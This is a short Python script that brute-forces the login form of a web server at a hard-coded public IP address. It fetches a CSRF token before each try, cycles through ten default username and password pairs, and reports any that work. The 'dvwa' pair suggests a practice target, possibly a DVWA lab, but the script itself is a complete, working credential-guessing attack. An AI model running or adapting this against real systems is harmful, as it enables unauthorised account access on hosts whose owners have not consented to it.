
import requests
import re
from urllib.parse import urljoin

base_url = "http://31.97.117.123"
session = requests.Session()

# Common credential pairs to try
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("root", "root"),
    ("root", "password"),
    ("dvwa", "dvwa"),
    ("guest", "guest"),
]

attempt = 0

for username, password in credentials:
    attempt += 1
    
    # Get fresh token
    login_page = session.get(urljoin(base_url, "/login.php"))
    token_match = re.search(r"user_token'\s*value='([^']*)'", login_page.text)
    token = token_match.group(1) if token_match else ""
    
    # Prepare login data
    login_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }
    
    # Attempt login
    response = session.post(urljoin(base_url, "/login.php"), data=login_data)
    
    # Check if login was successful
    if "logout.php" in response.text or "index.php" in response.text or response.status_code == 200:
        if "Login" not in response.text:  # If login form is not present, likely logged in
            print(f"[+] ATTEMPT {attempt}: SUCCESS! Credentials found: {username}:{password}")
            print(f"[+] Current URL: {response.url}")
            
            # Check if we got redirected to index/dashboard
            if "index.php" in response.url or "index" in response.text[:500]:
                print("[+] Successfully logged in!")
                break
        else:
            print(f"[-] ATTEMPT {attempt}: {username}:{password} - Failed (login form still shown)")
    else:
        print(f"[-] ATTEMPT {attempt}: {username}:{password} - Failed")

print(f"\n[*] Total attempts: {attempt}")

